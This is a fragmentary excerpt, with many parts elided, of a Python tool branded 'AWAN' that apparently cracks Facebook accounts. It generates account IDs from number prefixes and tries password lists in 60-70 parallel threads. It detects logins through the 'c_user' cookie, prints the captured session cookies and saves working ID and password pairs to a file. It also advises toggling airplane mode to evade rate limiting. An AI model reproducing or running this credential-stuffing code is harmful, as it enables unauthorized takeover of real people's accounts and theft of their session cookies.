...
\033[1;36m  / _ \ |   /| _ \ / _ \  / /   
\033[1;37m /_/ \_\|_|_\|___//_/ \_\/___|  (AWAN🔥😈) 
--------------------------------------------------
[•] AUTHOR     : \033[1;32AWAN\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		print('[•] THANKS FOR USE AWAN COMMAND ')
		time.sleep(3)
		exit()
	else:
...
def KHAN_KHAN():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32KHAN + KHAN')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def chos():
    ...
    for bilal in range(passx):
        ...
        HamiiID.append(pww)
    with ThreadPool(max_workers=70) as LAHORE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AWAN-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('AWAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[AWAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97AWAN\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
